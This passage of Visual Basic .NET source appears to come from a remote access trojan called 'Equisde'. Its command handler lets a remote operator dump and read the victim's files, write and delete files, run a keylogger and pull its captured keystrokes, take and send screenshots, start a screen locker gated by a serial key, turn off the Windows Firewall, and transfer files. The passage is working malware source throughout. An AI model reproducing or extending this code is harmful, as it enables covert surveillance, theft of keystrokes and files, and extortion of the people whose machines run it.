                    broadcastmsg("Obtener directorios", "XDControlPanel", False)
                    Dim tempString As String = Nothing
                    For Each FolderDesktop As String In My.Computer.FileSystem.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                        tempString = tempString + FolderDesktop & vbCrLf
                    Next
                    For Each FolderProgramFiles As String In My.Computer.FileSystem.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                        tempString = tempString + FolderProgramFiles & vbCrLf
                    Next
                    broadcastmsg("<--- START DIRECTORY DUMPDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END DIRECTORY DUMPDATA ---<", "XDControlPanel", False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.GetFiles(All)") Then 'Comandos essentials "GetFiles(All)"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Obtener archivos", "XDControlPanel", False)
                    Dim tempString As String = Nothing
                    For Each FileDesktop As String In My.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                        tempString = tempString + FileDesktop & vbCrLf
                    Next
                    For Each FileDownloads As String In My.Computer.FileSystem.GetFiles("C:\Users\" & Environment.UserName & "\Downloads")
                        tempString = tempString + FileDownloads & vbCrLf
                    Next
                    For Each FileDocuments As String In My.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                        tempString = tempString + FileDocuments & vbCrLf
                    Next
                    For Each FilePictures As String In My.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
                        tempString = tempString + FilePictures & vbCrLf
                    Next
                    For Each FileVideos As String In My.Computer.FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos))
                        tempString = tempString + FileVideos & vbCrLf
                    Next
                    broadcastmsg("<--- START FILES DUMPDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END FILES DUMPDATA ---<", "XDControlPanel", False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/XD.DirCommons.GetFiles()") Then 'Comandos essentials "DirCommons.GetFiles()"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    Dim tempString As String = Nothing
                    For Each Files As String In My.Computer.FileSystem.GetFiles(Starter.DIRCommons)
                        tempString = tempString + Files & vbCrLf
                    Next
                    broadcastmsg("<--- START FILES DUMPDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END FILES DUMPDATA ---<", "XDControlPanel", False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
                'Configuracion de Modulo ScreenLocker --------------------------------------------
            ElseIf UserCommand.ToString.Contains("/Modules.ScreenLocker.Config.SerialKey=") Then 'Comandos configuracion "SL.Config.SerialKey="

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Modules.ScreenLocker.Config.SerialKey=", "")
                    broadcastmsg("ScreenLocker SerialKey inserted", "XDControlPanel", False)
                    SerialKey = UserCommand
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.ScreenLocker.Config.SolveSerialKey=") Then 'Comandos configuracion "SL.Config.SolveSerialKey="

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Modules.ScreenLocker.Config.SolveSerialKey=", "")
                    broadcastmsg("ScreenLocker Solve SerialKey inserted", "XDControlPanel", False)
                    SolveSerial = UserCommand
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.ScreenLocker.Config.MaxTime=") Then 'Comandos configuracion "SL.Config.MaxTime="

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Modules.ScreenLocker.Config.MaxTime=", "")
                    broadcastmsg("ScreenLocker MaxTime Solve inserted", "XDControlPanel", False)
                    MaxTime = Val(UserCommand)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.ScreenLocker.Config.ActionAtTime=") Then 'Comandos configuracion "SL.Config.ActionAtTime="

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    UserCommand = UserCommand.Replace("/Modules.ScreenLocker.Config.ActionAtTime=", "")
                    broadcastmsg("ScreenLocker Action at MaxTime inserted", "XDControlPanel", False)
                    MaxTimeAction = UserCommand
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.ScreenLocker.Start()") Then 'Iniciar Modulos ScreenLocker

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("ScreenLocker iniciado", "XDControlPanel", False)
                    Try
                        If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\[SL]ConfigFile.ini") = True Then
                            My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\[SL]ConfigFile.ini")
                        End If
                        My.Computer.FileSystem.WriteAllText(Starter.DIRCommons & "\[SL]ConfigFile.ini", "#ScreenLocker @ EquisdeVRS - ConfigFile" &
                                                               vbCrLf & "SerialKey>" & SerialKey &
                                                               vbCrLf & "SolveSerial>" & SolveSerial &
                                                               vbCrLf & "MaxTime>" & MaxTime &
                                                               vbCrLf & "ActionAtTime>" & MaxTimeAction, False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.ScreenLocker.Start()ConfigFileSet)]Error: " & ex.Message)
                    End Try
                    Try
                        Try
                            If My.Computer.FileSystem.FileExists(Starter.DIRCommons & "\ScreenLockerXDKeep.exe") = True Then
                                My.Computer.FileSystem.DeleteFile(Starter.DIRCommons & "\ScreenLockerXDKeep.exe")
                            End If
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.ScreenLocker.Start(DeleteLast))]Error: " & ex.Message)
                        End Try
                        My.Computer.FileSystem.CopyFile(Application.StartupPath & "\Equisde.exe", Starter.DIRCommons & "\ScreenLockerXDKeep.exe")
                        Try
                            Process.Start(Starter.DIRCommons & "\ScreenLockerXDKeep.exe", "/LockScreen")
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@CMD(/Modules.ScreenLocker.Start(ProcessRunner))]Error: " & ex.Message)
                        End Try
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.ScreenLocker.Start())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.ScreenLocker.Stop()") Then 'Detener Modulos ScreenLocker

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("ScreenLocker detenido", "XDControlPanel", False)
                    Try
                        For Each ScreenLocker As Process In System.Diagnostics.Process.GetProcessesByName("ScreenLockerXDKeep")
                            ScreenLocker.Kill()
                        Next
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Stop(ScreenLocker.Close())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
                'Comandos para escritura, lectura y eliminado de archivos
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.Read=") Then 'Comandos essentials "File.Read="

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Leer archivo remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Windows.FileSystem.Read=", "")
                        Dim tempString As String = Nothing
                        tempString = My.Computer.FileSystem.ReadAllText(UserCommand)
                        broadcastmsg("<--- START FILE READDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END FILE READDATA ---<", "XDControlPanel", False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Windows.FileSystem.Read=(Lectura))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.Write=") Then 'Comandos essentials "File.Write="

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Escribir archivo remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Windows.FileSystem.Write=", "")
                        Dim TEXTO As String = UserCommand
                        Dim Cadena As String() = TEXTO.Split(">")
                        Dim RutaArchivo As String
                        Dim Contenido As String
                        RutaArchivo = Cadena(0)
                        Contenido = Cadena(1)
                        My.Computer.FileSystem.WriteAllText(RutaArchivo, Contenido, False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Windows.FileSystem.Write=(Escritura))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.DirView=") Then 'Comandos essentials "Dir.View"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Ver un directorio remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Windows.FileSystem.DirView=", "")
                        Dim tempString As String = Nothing
                        For Each Files As String In My.Computer.FileSystem.GetFiles(UserCommand)
                            tempString = tempString + Files & vbCrLf
                        Next
                        For Each Dirs As String In My.Computer.FileSystem.GetDirectories(UserCommand)
                            tempString = tempString + Dirs & vbCrLf
                        Next
                        broadcastmsg("<--- START DIRECTORY VIEWDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END DIRECTORY VIEWDATA ---<", "XDControlPanel", False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Windows.FileSystem.DirView=(Directorio))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.DirCreate=") Then 'Comandos essentials "Dir.Create"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Crear un directorio remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Windows.FileSystem.DirCreate=", "")
                        Dim TEXTO As String = UserCommand
                        Dim Cadena As String() = TEXTO.Split(">")
                        Dim Ruta As String
                        Dim Nombre As String
                        Ruta = Cadena(0)
                        Nombre = Cadena(1)
                        My.Computer.FileSystem.CreateDirectory(Ruta & "\" & Nombre)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Windows.FileSystem.DirCreate=(Directorio>Nombre))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.FileSystem.Delete=") Then 'Comandos essentials "File.Delete="

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Eliminar archivo/carpeta remot@", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Windows.FileSystem.Delete=", "")
                        My.Computer.FileSystem.DeleteFile(UserCommand)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Windows.FileSystem.Delete=(EliminarArchivo))]Error: " & ex.Message)
                    End Try
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Eliminar archivo/carpeta remot@", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Windows.FileSystem.Delete=", "")
                        My.Computer.FileSystem.DeleteDirectory(UserCommand, FileIO.DeleteDirectoryOption.DeleteAllContents)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Windows.FileSystem.Delete=(EliminarCarpeta))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/XD.Report.GetInfo()") Then 'Comandos essentials "ReportInfo"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Obtener reporte", "XDTCPCMDReader", False)
                        broadcastmsg("<--- START REPORT DATA --->" & vbCrLf & "EQUISDE VRS Report System" &
                                     vbCrLf & "Iniciado: " & Starter.StartedData &
                                     vbCrLf & "Parametro: " & Starter.Parametros &
                                     vbCrLf & ">--- END REPORT DATA ---<", "XDTCPCMDReader", False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/XD.Report.GetInfo())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
                'Comandos para el Keylogger ----------------------------------
            ElseIf UserCommand.ToString.Contains("/Modules.Keylogger.Start()") Then 'Comandos iniciar Keylogger

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Keylogger iniciado", "XDTCPCMDReader", False)
                        KeyloggerModule.Show()
                        KeyloggerModule.Objetive("StartKeylogger")
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Keylogger.Start())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Keylogger.GetData()") Then 'Comandos enviar datos del Keylogger

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Enviar datos del Keylogger", "XDTCPCMDReader", False)
                        broadcastmsg("Keylogger detenido", "XDTCPCMDReader", False)
                        KeyloggerModule.Objetive("SendKeyloggerData")
                        Threading.Thread.Sleep(150)
                        Dim tempString As String
                        tempString = My.Computer.FileSystem.ReadAllText(Starter.DIRCommons & KeyloggerModule.FileName)
                        broadcastmsg("<--- START KEYLOGGER DUMPDATA --->" & vbCrLf & tempString & vbCrLf & ">--- END KEYLOGGER DUMPDATA ---<", "XDTCPCMDReader", False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Keylogger.GetData())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.Keylogger.ClearData()") Then 'Comandos limpiar datos del Keylogger

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Limpiar datos del Keylogger", "XDTCPCMDReader", False)
                        KeyloggerModule.Objetive("StopKeylogger")
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.Keylogger.ClearData())]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
                'Comandos para el FileSender ----------------------------------
            ElseIf UserCommand.ToString.Contains("/Modules.FileSender.Send.File=") Then 'Comando FileSender "SendFile"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Enviar archivo remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Modules.FileSender.Send.File=", "")
                        FileSender.SendFile(UserCommand)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.FileSender.Send.File(EnviarArchivo))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.FileSender.Receive.File=") Then 'Comando FileSender "ReceiveFile"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Recibir archivo remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Modules.FileSender.Receive.File=", "")
                        UserCommand = UserCommand.Remove(0, UserCommand.LastIndexOf("\") + 1)
                        FileSender.ReceiveFile(UserCommand)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.FileSender.Receive.File(RecibirArchivo))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Windows.System.GetHost()") Then 'Comando essentials "GetHost"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Enviar archivo remoto", "XDTCPCMDReader", False)
                        Dim tempString As String = Nothing
                        tempString = vbCrLf
                        Dim MI_HOST As String
                        MI_HOST = Dns.GetHostName()
                        Dim MIS_IP As IPAddress() = Dns.GetHostAddresses(MI_HOST)
                        tempString = tempString & MI_HOST & vbCrLf
                        For I = 0 To MIS_IP.Length - 1
                            tempString = tempString & MIS_IP(I).ToString & vbCrLf
                        Next
                        broadcastmsg("<--- START HOST INFO VIEWDATA --->" & tempString & vbCrLf & ">--- END HOST INFO VIEWDATA ---<", "XDControlPanel", False)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.FileSender.Send.File(EnviarArchivo))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
                'Payload TakeScreenshot
            ElseIf UserCommand.ToString.Contains("/XD.Windows.TakeScreenShot()") Then 'Comando de XD "TakeScreenShot"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Tomar pantallazo", "XDTCPCMDReader", False)
                        Dim BF As New BinaryFormatter
                        Dim IMAGEN As Bitmap
                        Try
                            Dim BM As Bitmap
                            BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                            Dim DIBUJO As Graphics
                            DIBUJO = Graphics.FromImage(BM)
                            DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
                            DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
                            IMAGEN = New Bitmap(BM)
                            Dim DIBUJO2 As Graphics
                            DIBUJO2 = Graphics.FromImage(IMAGEN)
                            Dim MICURSOR As Cursor = Cursors.Hand
                            Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
                            MICURSOR.Draw(DIBUJO2, RECTANGULO)
                            Dim MS As New MemoryStream
                            IMAGEN.Save(MS, Imaging.ImageFormat.Jpeg)
                            IMAGEN = Image.FromStream(MS)
                            Dim FileName As String = Starter.DIRCommons & "\[" & Format(DateAndTime.TimeOfDay, "hh") & Format(DateAndTime.TimeOfDay, "mm") & Format(DateAndTime.TimeOfDay, "ss") & "]Screenshot.jpg"
                            IMAGEN.Save(FileName, Imaging.ImageFormat.Jpeg)
                            Threading.Thread.Sleep(100)
                            FileSender.SendFile(FileName)
                        Catch ex As Exception
                            Console.WriteLine("[handleClient@TakeAndSend]Error: " & ex.Message)
                        End Try
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/XD.Windows.TakeScreenShot(TakeAndSend))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/XD.Report.CreateWeb()") Then 'Comandos XD "Report.CreateWeb"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Crear reporte web", "XDControlPanel", False)
                    HttpReport.CreateWebReport()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/XD.Report.StopWeb()") Then 'Comandos XD "Report.StopWeb"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Detener reporte web", "XDControlPanel", False)
                    HttpReport.StopReporting()
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/XD.Report.Diagnostic(TRUE)") Then 'Comandos XD "Report.Diagnostic"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Permitir diagnostico", "XDControlPanel", False)
                    Starter.DiagnosticPostingStatus = True
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/XD.Report.Diagnostic(FALSE)") Then 'Comandos XD "Report.Diagnostic"

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("No permitir diagnostico", "XDControlPanel", False)
                    Starter.DiagnosticPostingStatus = False
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.WindowsFirewall(FALSE)") Then 'Comandos para activar modulos (Payload)

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Desactivar Firewall de Windows", "XDControlPanel", False)
                    Payloads.WindowsFirewall(False)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Payloads.WindowsFirewall(TRUE)") Then 'Comandos para activar modulos (Payload)

                If UserLoged = True Then
                    msg("From XDControlPanel> " + UserCommand)
                    broadcastmsg("Activar Firewall de Windows", "XDControlPanel", False)
                    Payloads.WindowsFirewall(True)
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Unistall=") Then 'Comandos para activar modulos (Payload)

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Desinstalar Equisde", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Unistall=", "")
                        Payloads.Unistall(UserCommand)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.FileSender.Send.File(EnviarArchivo))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            ElseIf UserCommand.ToString.Contains("/Modules.GGKeys.GetText=") Then 'Comandos modulo "GGKeys.GetText"

                If UserLoged = True Then
                    Try
                        msg("From XDControlPanel> " + UserCommand)
                        broadcastmsg("Crear un directorio remoto", "XDTCPCMDReader", False)
                        UserCommand = UserCommand.Replace("/Modules.GGKeys.GetText=", "")
                        Dim TEXTO As String = UserCommand
                        Dim Cadena As String() = TEXTO.Split(">")
                        Dim StringText As String
                        Dim Program As String
                        StringText = Cadena(0)
                        Program = Cadena(1)
                        GGKeys.GetStringText(StringText, Program)
                    Catch ex As Exception
                        Console.WriteLine("[handleClient@CMD(/Modules.GGKeys.GetText=(Texto>Programa))]Error: " & ex.Message)
                    End Try
                Else
                    broadcastmsg("You are not Loged.", "XDTCPCMDReader", False)
                End If
            End If
        Catch ex As Exception
            Console.WriteLine("[handleClient@CMDAnalizer]Error: " & ex.Message)
        End Try
    End Sub
End Class